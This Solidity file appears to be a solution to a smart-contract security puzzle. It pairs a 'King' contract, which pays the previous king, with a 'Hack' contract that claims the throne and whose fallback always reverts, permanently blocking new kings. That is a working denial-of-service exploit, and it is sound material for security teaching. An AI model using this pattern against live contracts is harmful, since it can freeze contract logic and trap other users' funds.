pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Hack{
    function hack(address payable _addr) public payable {
        (bool result, bytes memory data) = _addr.call{value:msg.value}("");
    if(!result) revert("The kingOfKings function reverted");
  }
  
   fallback() external payable {  // fallback function that will revert everytime.
        revert("look at me I'm the captain now");
    }
    }